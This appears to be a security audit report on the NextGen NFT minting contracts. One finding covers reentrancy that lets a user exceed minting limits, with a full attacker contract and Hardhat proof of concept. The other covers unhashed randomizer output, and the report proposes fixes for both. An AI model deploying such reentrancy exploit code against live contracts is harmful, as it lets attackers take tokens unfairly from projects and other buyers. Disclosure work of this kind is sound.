# [H-01] User can mint more than one tokens per period

## Lines of code

https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L193

## Impact

A malicious user can re-enter the `MinterContract.mint` function and mint more tokens than the limit of 1 token during each time period

This issue is outlined in the README as follows:

> Consider ways in which more than 1 token can be minted at the same time period for the Periodic Sale Model.

### Vulnerability details

The `MinterContract.mint` function is used by users to mint their tokens.

[View MinterContract.mint](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L234-L237)

```solidity
for(uint256 i = 0; i < _numberOfTokens; i++) {
uint256 mintIndex = gencore.viewTokensIndexMin(col) + gencore.viewCirSupply(col);
gencore.mint(mintIndex, mintingAddress, _mintTo, tokData, _saltfun_o, col, phase);
}
```

Within the `NextGenCore.mint` function, the `_mintProcessing` function is called.

[View NextGenCore.mint](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L193)

```solidity
_mintProcessing(mintIndex, _mintTo, _tokenData, _collectionID, _saltfun_o);
```

```solidity
function _mintProcessing(uint256 _mintIndex, address _recipient, string memory _tokenData, uint256 _collectionID, uint256 _saltfun_o) internal {
tokenData[_mintIndex] = _tokenData;
collectionAdditionalData[_collectionID].randomizer.calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);
tokenIdsToCollectionIds[_mintIndex] = _collectionID;
_safeMint(_recipient, _mintIndex);
}
```

Following this, the `ERC721._safeMint` function is invoked, wherein the NFT is minted, and the user's callback `onERC721Received` is triggered.

[View ERC721.\_safeMint](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/ERC721.sol#L245-L251)

```solidity
function _safeMint(address to, uint256 tokenId, bytes memory data) internal virtual {
_mint(to, tokenId);
require(
  _checkOnERC721Received(address(0), to, tokenId, data),
  "ERC721: transfer to non ERC721Receiver implementer"
);
}
```

Due to the user's callback (`onERC721Received`) called in [\_checkOnERC721Received](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/ERC721.sol#L407), a malicious user can re-enter the `MinterContract.mint` function, before the `tokensMinterPerAddress` is updated in `NextGenCore.mint`

[View NextGenCore.mint](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L197)

```solidity
_mintProcessing(mintIndex, _mintTo, _tokenData, _collectionID, _saltfun_o);
if (phase == 1) {
  tokensMintedAllowlistAddress[_collectionID][_mintingAddress] = tokensMintedAllowlistAddress[_collectionID][_mintingAddress] + 1;
} else {
@>  tokensMintedPerAddress[_collectionID][_mintingAddress] = tokensMintedPerAddress[_collectionID][_mintingAddress] + 1;
}
```

Allowing them to bypass the maximum limit per address check in `MinterContract.mint`.

[View MinterContract.mint](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L224)

```solidity
require(gencore.retrieveTokensMintedPublicPerAddress(col, msg.sender) + _numberOfTokens <= gencore.viewMaxAllowance(col), "Max");
```

```solidity
function retrieveTokensMintedPublicPerAddress(uint256 _collectionID, address _address) external view returns(uint256) {
return (tokensMintedPerAddress[_collectionID][_address]);
}
```

This allows the user to mint additional tokens exceeding the max allowance in the public sale.

```solidity
function viewMaxAllowance(uint256 _collectionID) external view returns (uint256) {
return(collectionAdditionalData[_collectionID].maxCollectionPurchases);
}
```

If the `salesOption` is set to 3, the user should be limited to minting only one token per period. However, due to the reentrancy issue described above, the user is able to mint multiple tokens.

The `timePeriod` is set by the admin in [setCollectionCosts](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L162).

## Proof of Concept

_To execute the POC, you will need to utilize the following `Attacker` contract. Place this contract in [smart-contracts/Attacker.sol](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/hardhat/smart-contracts)._

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import "./IERC721Receiver.sol";
import "./INextGenCore.sol";

interface IMinter {
  function mint(
      uint256 _collectionID,
      uint256 _numberOfTokens,
      uint256 _maxAllowance,
      string memory _tokenData,
      address _mintTo,
      bytes32[] calldata merkleProof,
      address _delegator,
      uint256 _saltfun_o
  ) external payable;

  function getPrice(uint256 _collectionId) external view returns (uint256);
}

contract Attacker is IERC721Receiver {
  IMinter minter;
  INextGenCore core;
  uint256 collectionId;
  uint256 mintedOver = 0;

  constructor(address _minter, address _core, uint256 _collectionId) {
      minter = IMinter(_minter);
      core = INextGenCore(_core);
      collectionId = _collectionId;
  }

  function mint() public {
      bytes32[] memory proof = new bytes32[](0);

      minter.mint{value: minter.getPrice(collectionId)}(
          collectionId,
          1,
          0,
          '{"tdh": "100"}',
          address(this),
          proof,
          address(this),
          2
      );
  }

  function onERC721Received(
      address operator,
      address from,
      uint256 tokenId,
      bytes calldata data
  ) external returns (bytes4) {
      if (mintedOver < 10) {
          mintedOver++;
          mint();
      }

      return this.onERC721Received.selector;
  }
}
```

_Next, insert the following test case into [test/nextGen.test.js](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/hardhat/test/nextGen.test.js#L430) and execute it using the command `hardhat test ./test/nextGen.test.js --grep 'Mint by period'`_

```javascript
describe("Mint by period", function () {
  const COLLECTION_ID = 1;
  const MAX_COLLECTION_PURCHASES = 10;
  const nowTimestamp = Math.floor(Date.now() / 1000);

  beforeEach(async function () {
    ({ signers, contracts } = await loadFixture(fixturesDeployment));

    //Verify Fixture
    expect(await contracts.hhAdmin.getAddress()).to.not.equal(ethers.ZeroAddress);
    expect(await contracts.hhCore.getAddress()).to.not.equal(ethers.ZeroAddress);
    expect(await contracts.hhDelegation.getAddress()).to.not.equal(ethers.ZeroAddress);
    expect(await contracts.hhMinter.getAddress()).to.not.equal(ethers.ZeroAddress);
    expect(await contracts.hhRandomizer.getAddress()).to.not.equal(ethers.ZeroAddress);
    expect(await contracts.hhRandoms.getAddress()).to.not.equal(ethers.ZeroAddress);

    //Create a collection & Set Data
    await contracts.hhCore.createCollection(
      "Test Collection 1",
      "Artist 1",
      "For testing",
      "www.test.com",
      "CCO",
      "https://ipfs.io/ipfs/hash/",
      "",
      ["desc"]
    );
    await contracts.hhAdmin.registerCollectionAdmin(1, signers.addr1.address, true);
    await contracts.hhCore.connect(signers.addr1).setCollectionData(
      COLLECTION_ID, // _collectionID
      signers.addr1.address, // _collectionArtistAddress
      MAX_COLLECTION_PURCHASES, // _maxCollectionPurchases
      20, // _collectionTotalSupply
      0 // _setFinalSupplyTimeAfterMint
    );

    //Set Minter Contract
    await contracts.hhCore.addMinterContract(contracts.hhMinter);

    //Set Randomizer Contract
    await contracts.hhCore.addRandomizer(1, contracts.hhRandomizer);

    //Set Collection Costs and Phases
    await contracts.hhMinter.setCollectionCosts(
      COLLECTION_ID, // _collectionID
      0, // _collectionMintCost
      0, // _collectionEndMintCost
      0, // _rate
      86400, // _timePeriod
      3, // _salesOptions
      "0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B" // delAddress
    );
    await contracts.hhMinter.setCollectionPhases(
      COLLECTION_ID, // _collectionID
      nowTimestamp, // _allowlistStartTime
      nowTimestamp + 1, // _allowlistEndTime
      1999999999, // _publicStartTime
      3000000000, // _publicEndTime
      "0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870" // _merkleRoot
    );
  });

  context("Minting", () => {
    it("Due to reentrancy, the user can mint more than 1 tokens per period", async function () {
      const attackerFactory = await ethers.getContractFactory("smart-contracts/Attacker.sol:Attacker");
      const attacker = await attackerFactory.deploy(
        await contracts.hhMinter.getAddress(),
        await contracts.hhCore.getAddress(),
        COLLECTION_ID
      );
      const attackerAddress = await attacker.getAddress();

      expect(parseInt(await contracts.hhCore.viewMaxAllowance(COLLECTION_ID))).to.equal(MAX_COLLECTION_PURCHASES);
      expect(
        parseInt(await contracts.hhCore.retrieveTokensMintedPublicPerAddress(COLLECTION_ID, attackerAddress))
      ).to.equal(0);

      await ethers.provider.send("evm_setNextBlockTimestamp", [2000000000]);
      await ethers.provider.send("evm_mine");

      await attacker.mint();

      const mintedByTheAttacker = parseInt(
        await contracts.hhCore.retrieveTokensMintedPublicPerAddress(COLLECTION_ID, attackerAddress)
      );
      const maxCollectionPurchases = parseInt(await contracts.hhCore.viewMaxAllowance(COLLECTION_ID));

      console.log(
        `The attacker has minted: '${mintedByTheAttacker}' tokens, while the max limit of tokens for collection '${COLLECTION_ID}' is '${maxCollectionPurchases}'`
      );
    });
  });
});
```

## Tools Used

Manual Review

## Recommended Mitigation Steps

You have two options for addressing the issue:

1. For the [MinterContract.mint](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L196) function use OpenZeppelin's ReentrancyGuard along with the `nonReentrant` modifier to prevent reentrancy.

```diff
-function mint(uint256 _collectionID, uint256 _numberOfTokens, uint256 _maxAllowance, string memory _tokenData, address _mintTo, bytes32[] calldata merkleProof, address _delegator, uint256 _saltfun_o) public payable {
+function mint(uint256 _collectionID, uint256 _numberOfTokens, uint256 _maxAllowance, string memory _tokenData, address _mintTo, bytes32[] calldata merkleProof, address _delegator, uint256 _saltfun_o) public payable nonReentrant {
```

2. Increment `tokensMintedPerAddress` before the `_mintProcessing` invocation

```diff
if (collectionAdditionalData[_collectionID].collectionTotalSupply >= collectionAdditionalData[_collectionID].collectionCirculationSupply) {
+   if (phase == 1) {
+       tokensMintedAllowlistAddress[_collectionID][_mintingAddress] = tokensMintedAllowlistAddress[_collectionID][_mintingAddress] + 1;
+   } else {
+       tokensMintedPerAddress[_collectionID][_mintingAddress] = tokensMintedPerAddress[_collectionID][_mintingAddress] + 1;
+   }
  _mintProcessing(mintIndex, _mintTo, _tokenData, _collectionID, _saltfun_o);
-   if (phase == 1) {
-       tokensMintedAllowlistAddress[_collectionID][_mintingAddress] = tokensMintedAllowlistAddress[_collectionID][_mintingAddress] + 1;
-   } else {
-       tokensMintedPerAddress[_collectionID][_mintingAddress] = tokensMintedPerAddress[_collectionID][_mintingAddress] + 1;
-   }
}
```

# [M-01] Randomizers will not produce a valid hash value

## Lines of code

https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol#L66
https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerRNG.sol#L49

## Impact

The [RandomizerVRF](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol) and [RandomizerRNG](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerRNG.sol) contracts will not return random hashes, instead, they will only return the generated random number.
This results in non-unique/duplicated `tokenHash` values and non-randomly generated NFTs.

## Proof of Concept

The codeflow for minting a token is as follows:

1. The user calls `MinterContract.mint`.

2. `MinterContract` calls `NextGenCore.mint`.

3. Internally, `NextGenCore._mintProcessing` is called.

src: [NextGenCore.\_mintProcessing](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L227-L232)

```solidity
function _mintProcessing(uint256 _mintIndex, address _recipient, string memory _tokenData, uint256 _collectionID, uint256 _saltfun_o) internal {
tokenData[_mintIndex] = _tokenData;
collectionAdditionalData[_collectionID].randomizer.calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);
tokenIdsToCollectionIds[_mintIndex] = _collectionID;
_safeMint(_recipient, _mintIndex);
}
```

4. The source of randomness is requested from the specified randomizer ([RandomizerVRF](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol) or [RandomizerRNG](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerRNG.sol)) contract for this collection.

```solidity
collectionAdditionalData[_collectionID].randomizer.calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);
```

5. This call triggers the `requestRandomWords` function for the specified randomizer, which makes a request to the VRF service.

6. After some blocks, the VRF service returns the random value by calling the callback `fulfillRandomWords` function.

7. The `fulfillRandomWords` function calls the `NextGenCore.setTokenHash` and passes the `_collectionId`, `_mintIndex` (`_tokenId`), and `_hash` for the token. Both Randomizer contracts have similar `fulfillRandomWords` functions with identical ways to generate the hash.

- RandomizerRNG

```solidity
function fulfillRandomWords(uint256 id, uint256[] memory numbers) internal override {
gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[id]], requestToToken[id], bytes32(abi.encodePacked(numbers,requestToToken[id])));
}
```

- RandomizerVRF

```solidity
function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) internal override {
gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[_requestId]], requestToToken[_requestId], bytes32(abi.encodePacked(_randomWords,requestToToken[_requestId])));
emit RequestFulfilled(_requestId, _randomWords);
}
```

The token hash is set for the specified token without any validations. The only validation is to check if the token hash is not already set.
src: [NextGenCore.setTokenHash](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L299-L303)

```solidity
function setTokenHash(uint256 _collectionID, uint256 _mintIndex, bytes32 _hash) external {
require(msg.sender == collectionAdditionalData[_collectionID].randomizerContract);
require(tokenToHash[_mintIndex] == 0x0000000000000000000000000000000000000000000000000000000000000000);
tokenToHash[_mintIndex] = _hash;
}
```

Here is the problem, the way used for the token hash generating is wrong and return only the trimmed generated random number in plain format (not hashed). The lines blow results in just trimmed first number in the numbers array, and return it in plain format.

The problem lies in the method used for generating the token hash, which is incorrect and returns only the trimmed generated random number in plain format (not hashed). The lines below result in just the trimmed first number in the numbers array and return it in plain format.

```solidity
// RandomizerRNG
bytes32(abi.encodePacked(numbers, requestToToken[id]))

// RandomizerVRF
bytes32(abi.encodePacked(_randomWords, requestToToken[_requestId]))
```

## Tools Used

Manual Review

## Recommended Mitigation Steps

Hash the value returned from the VRF with the `tokenId`.

1. RandomizerVRF

```diff
function fulfillRandomWords(uint256 id, uint256[] memory numbers) internal override {
-   gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[id]], requestToToken[id], bytes32(abi.encodePacked(numbers,requestToToken[id])));
+   gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[id]], requestToToken[id], keccak256(abi.encodePacked(numbers,requestToToken[id])));
}
```

2. RandomizerRNG

```diff
function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) internal override {
-   gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[_requestId]], requestToToken[_requestId], bytes32(abi.encodePacked(_randomWords,requestToToken[_requestId])));
+   gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[_requestId]], requestToToken[_requestId], keccak256(abi.encodePacked(_randomWords,requestToToken[_requestId])));
emit RequestFulfilled(_requestId, _randomWords);
}
```
